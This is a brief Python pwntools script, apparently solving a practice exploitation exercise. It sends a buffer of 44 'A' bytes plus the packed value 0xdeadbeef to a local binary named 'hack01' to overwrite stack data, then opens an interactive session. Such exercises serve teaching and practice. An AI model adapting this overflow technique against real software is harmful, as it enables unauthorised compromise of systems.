from pwn import *

context.arch="amd64"
context.log_level='debug'
p = process("./hack01")
payload=b"A"*(0x30-0x4)+p64(0xdeadbeef)
p.sendlineafter(b"Input Buf: \n",payload)
pause()
p.interactive()